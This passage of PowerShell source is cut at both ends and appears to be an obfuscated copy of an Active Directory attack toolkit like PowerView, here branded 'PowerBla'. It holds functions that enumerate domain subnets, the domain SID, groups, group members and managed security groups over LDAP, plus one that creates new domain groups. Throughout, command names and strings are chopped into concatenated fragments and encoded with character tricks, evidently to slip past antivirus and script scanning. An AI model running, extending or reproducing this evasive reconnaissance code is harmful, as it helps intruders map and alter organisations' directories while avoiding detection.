                &('Wr'+'i'+'te'+'-Verbose') ('[G'+'e'+'t-Domain'+'Su'+'bn'+'et] '+'Usi'+'ng '+'addi'+'ti'+'onal'+' '+'L'+'DAP '+'fi'+'lter'+': '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            &('Wri'+'te-V'+'erbos'+'e') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if ($PSBoundParameters[('Find'+'One')]) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | &('Where'+'-O'+'bje'+'ct') {$_} | &('ForE'+'ach-O'+'bjec'+'t') {
                if ($PSBoundParameters[('R'+'aw')]) {
                    $Subnet = $_
                }
                else {
                    $Subnet = &('Co'+'nve'+'rt-LDA'+'PProperty') -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, ('Power'+'Bla.'+'Subne'+'t'))

                if ($PSBoundParameters[('Si'+'te'+'Name')]) {
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('W'+'r'+'ite-Verb'+'ose') ('['+'Get'+'-Do'+'mainSubnet'+'] '+'Err'+'or '+'d'+'isposing'+' '+'of'+' '+'the'+' '+'Results'+' '+'o'+'bj'+'ect: '+"$_")
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'o'+'uldProce'+'ss'), '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'om'+'ainContr'+'o'+'ller'))]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        ('LDAP'+'Fil'+'te'+'r') = ('(userA'+'ccountCont'+'r'+'ol:1.2.840.1'+'13'+'556.1.'+'4.80'+'3:=8192'+')')
    }
    if ($PSBoundParameters[('Dom'+'ai'+'n')]) { $SearcherArguments[('Domai'+'n')] = $Domain }
    if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $SearcherArguments[('Se'+'rve'+'r')] = $Server }
    if ($PSBoundParameters[('Crede'+'nt'+'ial')]) { $SearcherArguments[('Crede'+'nt'+'ial')] = $Credential }

    $DCSID = &('Get'+'-Doma'+'inCo'+'mp'+'ut'+'er') @SearcherArguments -FindOne | &('Select-O'+'b'+'j'+'ect') -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        &('Writ'+'e-V'+'erbose') ('['+'Ge'+'t-Do'+'mainSI'+'D] '+'E'+'rro'+'r '+'ext'+'ractin'+'g '+'dom'+'ain'+' '+'SID'+' '+'for'+' '+"'$Domain'")
    }
}


function Get-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSho'+'uld'+'Proces'+'s'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'seDe'+'c'+'l'+'are'+'dVars'+'MoreThan'+'A'+'s'+'signments'), '')]
    [OutputType(('Po'+'werBla.Gro'+'up'))]
    [CmdletBinding(DefaultParameterSetName = {'AllowD'+'e'+'legat'+'ion'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('D'+'isti'+'nguis'+'hedName'), ('Sa'+'mA'+'ccount'+'Nam'+'e'), ('Na'+'me'), ('MemberD'+'isti'+'ngu'+'ishedNam'+'e'), ('M'+'emberNam'+'e'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias(('Us'+'erNam'+'e'))]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet(('Doma'+'i'+'nLocal'), ('No'+'tDo'+'mainLocal'), ('Gl'+'obal'), ('NotG'+'lob'+'al'), ('Unive'+'rsal'), ('Not'+'Un'+'iversal'))]
        [Alias(('Scop'+'e'))]
        [String]
        $GroupScope,

        [ValidateSet(('S'+'ecuri'+'ty'), ('D'+'is'+'t'+'ribution'), ('Cr'+'ea'+'t'+'edBySystem'), ('N'+'otC'+'r'+'eatedBySy'+'stem'))]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Doma'+'in'+'Cont'+'roller'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('OneLe'+'v'+'el'), ('S'+'ubtr'+'ee'))]
        [String]
        $SearchScope = ('Subt'+'re'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('D'+'acl'), ('G'+'roup'), ('N'+'one'), ('Ow'+'ner'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('R'+'etur'+'nOne'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('Do'+'main')]) { $SearcherArguments[('Do'+'ma'+'in')] = $Domain }
        if ($PSBoundParameters[('Prop'+'ert'+'ies')]) { $SearcherArguments[('Pr'+'ope'+'rties')] = $Properties }
        if ($PSBoundParameters[('Se'+'ar'+'chBa'+'se')]) { $SearcherArguments[('Sear'+'chB'+'ase')] = $SearchBase }
        if ($PSBoundParameters[('Serv'+'er')]) { $SearcherArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Sea'+'rc'+'hSco'+'pe')]) { $SearcherArguments[('Searc'+'hS'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Result'+'Page'+'Si'+'z'+'e')]) { $SearcherArguments[('Resu'+'ltPa'+'geS'+'ize')] = $ResultPageSize }
        if ($PSBoundParameters[('Se'+'rv'+'erTi'+'me'+'Limit')]) { $SearcherArguments[('Ser'+'verTimeLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('S'+'ecurity'+'M'+'asks')]) { $SearcherArguments[('SecurityMa'+'sk'+'s')] = $SecurityMasks }
        if ($PSBoundParameters[('Tomb'+'st'+'one')]) { $SearcherArguments[('To'+'mbston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('C'+'r'+'edential')]) { $SearcherArguments[('Cr'+'ed'+'ent'+'ial')] = $Credential }
        $GroupSearcher = &('Get-Do'+'ma'+'inSear'+'cher') @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters[('Mem'+'ber'+'Ide'+'n'+'tity')]) {

                if ($SearcherArguments[('Prop'+'er'+'ties')]) {
                    $OldProperties = $SearcherArguments[('P'+'ro'+'perties')]
                }

                $SearcherArguments[('Identi'+'ty')] = $MemberIdentity
                $SearcherArguments[('R'+'aw')] = $True

                &('G'+'et'+'-Domai'+'nObje'+'ct') @SearcherArguments | &('F'+'or'+'Each-Object') {
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    $ObjectDirectoryEntry.RefreshCache(('t'+'okenGro'+'ups'))

                    $ObjectDirectoryEntry.TokenGroups | &('ForEac'+'h-'+'Obj'+'e'+'ct') {
                        $GroupSid = (&('New-Obje'+'c'+'t') System.Security.Principal.SecurityIdentifier($_,0)).Value

                        if ($GroupSid -notmatch ('^S-1-'+'5-'+'32-.*')) {
                            $SearcherArguments[('I'+'dent'+'ity')] = $GroupSid
                            $SearcherArguments[('R'+'aw')] = $False
                            if ($OldProperties) { $SearcherArguments[('Pro'+'pert'+'ies')] = $OldProperties }
                            $Group = &('G'+'et'+'-D'+'omai'+'nObj'+'ect') @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, ('PowerBla.'+'Gr'+'o'+'u'+'p'))
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | &('W'+'h'+'ere-Object') {$_} | &('ForEach'+'-'+'Ob'+'ject') {
                    $IdentityInstance = $_.Replace('(', (('c'+'Wh28') -cReplaCE'cWh',[CHAR]92)).Replace(')', (('23'+'5'+'29').ReplAcE('235',[stRing][chAr]92)))
                    if ($IdentityInstance -match ('^S-'+'1-')) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match ('^C'+'N=')) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[('Dom'+'ai'+'n')]) -and (-not $PSBoundParameters[('Searc'+'hBa'+'se')])) {
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('DC'+'='))) -replace ('DC'+'='),'' -replace ',','.'
                            &('Wr'+'ite'+'-V'+'erbose') ('[Get-Domai'+'n'+'G'+'r'+'oup] '+'Ex'+'tr'+'acted '+'d'+'oma'+'in '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            $SearcherArguments[('Dom'+'ain')] = $IdentityDomain
                            $GroupSearcher = &('Get-'+'Domain'+'S'+'ea'+'r'+'cher') @SearcherArguments
                            if (-not $GroupSearcher) {
                                &('Wri'+'te'+'-Warn'+'ing') ('['+'Ge'+'t-Domain'+'Grou'+'p] '+'Unabl'+'e'+' '+'t'+'o '+'r'+'etr'+'ieve '+'dom'+'a'+'in '+'sea'+'rc'+'her '+'f'+'or '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | &('F'+'orEach-Obj'+'ect') { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace((('qB128').replACE('qB1','\')), '(').Replace((('BO'+'h'+'29').replAce(([CHAR]66+[CHAR]79+[CHAR]104),[STrInG][CHAR]92)), ')') | &('Conv'+'ert-'+'ADNam'+'e') -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[('Dom'+'ain')] = $GroupDomain
                            &('W'+'ri'+'te-'+'Verbos'+'e') ('[G'+'et-D'+'omai'+'nGro'+'up'+'] '+'Extra'+'cted'+' '+'do'+'main'+' '+"'$GroupDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            $GroupSearcher = &('Get-D'+'o'+'ma'+'inSea'+'r'+'cher') @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters[('AdminC'+'o'+'un'+'t')]) {
                    &('Write'+'-Ve'+'r'+'bose') ('[Get-Domain'+'G'+'roup'+'] '+'Searching for'+' '+'admi'+'nCount=1')
                    $Filter += ('(ad'+'m'+'incou'+'n'+'t=1)')
                }
                if ($PSBoundParameters[('Gr'+'oupSc'+'ope')]) {
                    $GroupScopeValue = $PSBoundParameters[('G'+'ro'+'upScop'+'e')]
                    $Filter = Switch ($GroupScopeValue) {
                        ('D'+'omainLoc'+'al')       { ('(gro'+'up'+'T'+'ype:1'+'.2.840.'+'113556.1.4'+'.8'+'0'+'3'+':='+'4)') }
                        ('N'+'ot'+'Doma'+'inLocal')    { ('(!(gro'+'u'+'pT'+'ype:1.2.840.1'+'13556.1.4.803'+':='+'4))') }
                        ('Glo'+'b'+'al')            { ('(gr'+'o'+'up'+'T'+'y'+'pe:1'+'.2.8'+'40.113'+'556.1.4.80'+'3:'+'=2)') }
                        ('NotGl'+'obal')         { ('(!(g'+'roup'+'Type:'+'1.'+'2'+'.840.'+'113'+'556'+'.1'+'.4.8'+'03:='+'2))') }
                        ('Un'+'i'+'ve'+'rsal')         { ('(gr'+'oupT'+'y'+'pe:1'+'.'+'2'+'.840.113556.'+'1'+'.4.'+'803:='+'8)') }
                        ('N'+'ot'+'Univer'+'sal')      { ('('+'!('+'g'+'roup'+'Type:1.2.840.1135'+'5'+'6'+'.1.4.'+'80'+'3'+':=8))') }
                    }
                    &('Wr'+'ite-Verbos'+'e') ('[Get-'+'Domain'+'Gro'+'u'+'p'+'] '+'S'+'ea'+'rc'+'hing '+'fo'+'r '+'group'+' '+'scop'+'e'+' '+"'$GroupScopeValue'")
                }
                if ($PSBoundParameters[('GroupPro'+'pe'+'r'+'ty')]) {
                    $GroupPropertyValue = $PSBoundParameters[('GroupP'+'r'+'opert'+'y')]
                    $Filter = Switch ($GroupPropertyValue) {
                        ('S'+'ecurity')              { ('('+'group'+'Ty'+'p'+'e:1.2.840'+'.'+'113556.'+'1.'+'4.803'+':='+'214'+'7483648'+')') }
                        ('D'+'istr'+'ibu'+'tion')          { ('(!('+'grou'+'pType:'+'1.'+'2'+'.84'+'0.1'+'135'+'56.1.4.803:='+'214'+'74'+'83648)'+')') }
                        ('Crea'+'tedBySy'+'st'+'em')       { ('('+'g'+'roup'+'Type'+':1.2'+'.8'+'4'+'0.1'+'13556.1.4.803'+':=1)') }
                        ('NotCrea'+'t'+'ed'+'BySystem')    { ('('+'!(g'+'roup'+'T'+'ype:1.'+'2.840.1'+'13556.1.4'+'.803'+':=1))') }
                    }
                    &('W'+'ri'+'te-Verbo'+'se') ('[Get-'+'D'+'oma'+'inG'+'roup] '+'Se'+'archi'+'ng '+'f'+'or '+'g'+'roup '+'p'+'ro'+'pe'+'rty '+"'$GroupPropertyValue'")
                }
                if ($PSBoundParameters[('LDAPF'+'ilt'+'er')]) {
                    &('Wr'+'ite-Ve'+'rbos'+'e') ('[Get'+'-Domai'+'n'+'Group] '+'Usi'+'ng '+'ad'+'d'+'itiona'+'l '+'LD'+'AP '+'f'+'ilter: '+"$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                &('Wri'+'te-Ve'+'rb'+'ose') "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if ($PSBoundParameters[('F'+'indOne')]) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | &('W'+'here'+'-O'+'bject') {$_} | &('ForEach-'+'Obje'+'ct') {
                    if ($PSBoundParameters[('R'+'aw')]) {
                        $Group = $_
                    }
                    else {
                        $Group = &('C'+'onvert-L'+'DA'+'PP'+'roperty') -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, ('Pow'+'e'+'rBla.Gr'+'o'+'up'))
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        &('Write'+'-Ver'+'b'+'os'+'e') ('[Get-DomainGroup] '+'E'+'rr'+'or d'+'i'+'sposi'+'ng of the '+'R'+'e'+'s'+'u'+'l'+'t'+'s '+'ob'+'ject')
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUse'+'Shou'+'ldProc'+'ess'+'ForSta'+'teCh'+'angingFu'+'ncti'+'ons'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShouldP'+'r'+'oces'+'s'), '')]
    [OutputType(('DirectoryS'+'er'+'v'+'ice'+'s.AccountManag'+'em'+'e'+'nt.Gr'+'oup'+'P'+'rin'+'cipal'))]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        ('Id'+'en'+'tity') = $SamAccountName
    }
    if ($PSBoundParameters[('Domai'+'n')]) { $ContextArguments[('Dom'+'ain')] = $Domain }
    if ($PSBoundParameters[('C'+'r'+'edentia'+'l')]) { $ContextArguments[('C'+'rede'+'ntial')] = $Credential }
    $Context = &('Ge'+'t-'+'Prin'+'ci'+'palContext') @ContextArguments

    if ($Context) {
        $Group = &('Ne'+'w-O'+'bject') -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters[('Nam'+'e')]) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters[('Disp'+'layNam'+'e')]) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters[('D'+'escript'+'i'+'on')]) {
            $Group.Description = $Description
        }

        &('Write-'+'Verbo'+'se') ('[New-'+'D'+'omainGroup]'+' '+'At'+'temptin'+'g '+'to'+' '+'cr'+'e'+'ate '+'gr'+'oup '+"'$SamAccountName'")
        try {
            $Null = $Group.Save()
            &('Wri'+'te-'+'Verbos'+'e') ('[New-Do'+'mai'+'nG'+'roup] '+'Gr'+'oup '+"'$SamAccountName' "+'s'+'ucc'+'essfully '+'cre'+'ate'+'d')
            $Group
        }
        catch {
            &('Wri'+'te-Wa'+'rning') ('['+'New-Doma'+'in'+'Group]'+' '+'Erro'+'r '+'cr'+'eat'+'ing '+'group'+' '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function Get-DomainManagedSecurityGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Sho'+'ul'+'dProces'+'s'), '')]
    [OutputType(('P'+'owerBla.M'+'an'+'agedSe'+'curi'+'tyGrou'+'p'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Na'+'me'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPa'+'t'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainContr'+'ol'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('OneLe'+'ve'+'l'), ('Sub'+'tre'+'e'))]
        [String]
        $SearchScope = ('Su'+'btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            ('LD'+'APFi'+'lte'+'r') = ('(&(managedB'+'y=*)(group'+'Typ'+'e:1.2.840'+'.113'+'556.'+'1.4.8'+'03:'+'=2'+'14'+'7483'+'6'+'4'+'8))')
            ('Pr'+'o'+'pe'+'rties') = ('distinguishedName,m'+'anage'+'dBy'+',samaccounttyp'+'e,sa'+'m'+'a'+'c'+'countna'+'me')
        }
        if ($PSBoundParameters[('Sear'+'chBas'+'e')]) { $SearcherArguments[('S'+'earchBas'+'e')] = $SearchBase }
        if ($PSBoundParameters[('Serve'+'r')]) { $SearcherArguments[('Se'+'r'+'ver')] = $Server }
        if ($PSBoundParameters[('Se'+'arc'+'h'+'Scope')]) { $SearcherArguments[('S'+'e'+'archSc'+'ope')] = $SearchScope }
        if ($PSBoundParameters[('ResultPage'+'S'+'ize')]) { $SearcherArguments[('Re'+'s'+'ultPageSiz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erv'+'erTimeL'+'imi'+'t')]) { $SearcherArguments[('Serve'+'rTimeLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Sec'+'u'+'rityMasks')]) { $SearcherArguments[('S'+'ec'+'urityM'+'as'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('Tom'+'bston'+'e')]) { $SearcherArguments[('T'+'ombston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('C'+'re'+'dential')]) { $SearcherArguments[('Cre'+'d'+'en'+'tial')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[('Do'+'main')]) {
            $SearcherArguments[('Do'+'ma'+'in')] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        &('Get'+'-D'+'omainGro'+'up') @SearcherArguments | &('F'+'orE'+'ach-Ob'+'jec'+'t') {
            $SearcherArguments[('Pro'+'pertie'+'s')] = ('d'+'ist'+'in'+'guish'+'ed'+'name,name'+','+'samaccou'+'ntty'+'pe,sama'+'ccountn'+'ame,objectsid')
            $SearcherArguments[('I'+'de'+'ntity')] = $_.managedBy
            $Null = $SearcherArguments.Remove(('LDA'+'PFi'+'l'+'ter'))

            $GroupManager = &('Ge'+'t-'+'Do'+'mainOb'+'ject') @SearcherArguments
            $ManagedGroup = &('Ne'+'w-'+'Objec'+'t') PSObject
            $ManagedGroup | &('Add-Mem'+'b'+'er') Noteproperty ('Gr'+'o'+'upNam'+'e') $_.samaccountname
            $ManagedGroup | &('Ad'+'d'+'-Mem'+'ber') Noteproperty ('Grou'+'pDi'+'sting'+'uishe'+'dN'+'ame') $_.distinguishedname
            $ManagedGroup | &('Add-M'+'e'+'mbe'+'r') Noteproperty ('Manag'+'er'+'Nam'+'e') $GroupManager.samaccountname
            $ManagedGroup | &('Add-'+'Membe'+'r') Noteproperty ('ManagerDisti'+'ngu'+'ished'+'N'+'ame') $GroupManager.distinguishedName

            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | &('Add'+'-Me'+'mber') Noteproperty ('Man'+'ag'+'erType') ('Grou'+'p')
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | &('Add'+'-Mem'+'ber') Noteproperty ('M'+'anagerTyp'+'e') ('Use'+'r')
            }

            $ACLArguments = @{
                ('Ide'+'n'+'tity') = $_.distinguishedname
                ('R'+'ightsFilte'+'r') = ('WriteMe'+'mb'+'er'+'s')
            }
            if ($PSBoundParameters[('Se'+'rver')]) { $ACLArguments[('Serve'+'r')] = $Server }
            if ($PSBoundParameters[('S'+'earchSc'+'ope')]) { $ACLArguments[('Sear'+'c'+'hScop'+'e')] = $SearchScope }
            if ($PSBoundParameters[('Result'+'Pag'+'e'+'S'+'ize')]) { $ACLArguments[('Re'+'sul'+'tP'+'ageSize')] = $ResultPageSize }
            if ($PSBoundParameters[('ServerTimeL'+'im'+'it')]) { $ACLArguments[('Se'+'rverTi'+'me'+'Lim'+'it')] = $ServerTimeLimit }
            if ($PSBoundParameters[('Tomb'+'st'+'on'+'e')]) { $ACLArguments[('Tombs'+'t'+'one')] = $Tombstone }
            if ($PSBoundParameters[('Cred'+'enti'+'al')]) { $ACLArguments[('C'+'r'+'edenti'+'al')] = $Credential }


            $ManagedGroup | &('A'+'d'+'d-Member') Noteproperty ('Man'+'agerCanW'+'r'+'ite') ('UNK'+'NOWN')

            $ManagedGroup.PSObject.TypeNames.Insert(0, ('PowerBla.'+'M'+'a'+'nagedSec'+'u'+'rit'+'y'+'Gro'+'up'))
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Sho'+'uldP'+'roc'+'ess'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUse'+'De'+'cl'+'aredV'+'arsMoreTha'+'nA'+'ss'+'ignme'+'n'+'ts'), '')]
    [OutputType(('PowerBl'+'a.Gr'+'o'+'up'+'Mem'+'be'+'r'))]
    [CmdletBinding(DefaultParameterSetName = {'Non'+'e'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Di'+'st'+'i'+'nguish'+'ed'+'Name'), ('Sam'+'Ac'+'countN'+'ame'), ('Na'+'me'), ('Me'+'mberDist'+'i'+'ngui'+'she'+'dName'), ('Me'+'mbe'+'rNam'+'e'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = "MaNua`l`R`ECuRSE")]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = "rEcURSE`Us`inGmA`TChin`G`R`U`lE")]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lte'+'r'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('A'+'DSPa'+'th'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Domain'+'Co'+'nt'+'r'+'oller'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('OneLe'+'v'+'el'), ('Su'+'bt'+'ree'))]
        [String]
        $SearchScope = ('Subtr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('Dac'+'l'), ('Gro'+'up'), ('No'+'ne'), ('Own'+'er'), ('Sa'+'cl'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            ('Pro'+'p'+'er'+'ties') = ('membe'+'r,sam'+'accountname,disti'+'nguish'+'ed'+'nam'+'e')
        }
        if ($PSBoundParameters[('Do'+'main')]) { $SearcherArguments[('Doma'+'in')] = $Domain }
        if ($PSBoundParameters[('LD'+'APFilt'+'er')]) { $SearcherArguments[('LDA'+'PFilte'+'r')] = $LDAPFilter }
        if ($PSBoundParameters[('Sea'+'rchBas'+'e')]) { $SearcherArguments[('Search'+'Bas'+'e')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erv'+'er')]) { $SearcherArguments[('S'+'e'+'rver')] = $Server }
        if ($PSBoundParameters[('Searc'+'hSc'+'ope')]) { $SearcherArguments[('SearchS'+'cop'+'e')] = $SearchScope }
        if ($PSBoundParameters[('Resul'+'tPag'+'eSiz'+'e')]) { $SearcherArguments[('R'+'es'+'ul'+'tPag'+'eSize')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erverTi'+'m'+'eLimit')]) { $SearcherArguments[('Serve'+'r'+'Ti'+'meLi'+'mit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombs'+'tone')]) { $SearcherArguments[('Tomb'+'s'+'tone')] = $Tombstone }
        if ($PSBoundParameters[('Cre'+'de'+'ntial')]) { $SearcherArguments[('Cre'+'d'+'ent'+'ial')] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters[('Doma'+'in')]) { $ADNameArguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('S'+'erver')]) { $ADNameArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('Cred'+'ent'+'ial')]) { $ADNameArguments[('Cred'+'ent'+'ial')] = $Credential }
    }

    PROCESS {
        $GroupSearcher = &('Ge'+'t-Domai'+'nSearc'+'her') @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters[('R'+'ecu'+'r'+'seUsingMatchingRul'+'e')]) {
                $SearcherArguments[('Id'+'ent'+'ity')] = $Identity
                $SearcherArguments[('Ra'+'w')] = $True
                $Group = &('G'+'et'+'-Do'+'mainGro'+'up') @SearcherArguments

                if (-not $Group) {
                    &('W'+'rite-Wa'+'rn'+'ing') ('[Get-DomainGr'+'o'+'upM'+'ember'+'] '+'Er'+'r'+'or '+'sear'+'c'+'hing '+'fo'+'r '+'gr'+'o'+'up '+'with'+' '+'identit'+'y:'+' '+"$Identity")
                }
                else {
                    $GroupFoundName = $Group.properties.item(('s'+'amac'+'coun'+'tna'+'me'))[0]
                    $GroupFoundDN = $Group.properties.item(('di'+'s'+'t'+'ing'+'ui'+'shedname'))[0]

                    if ($PSBoundParameters[('D'+'omain')]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                        }
                    }
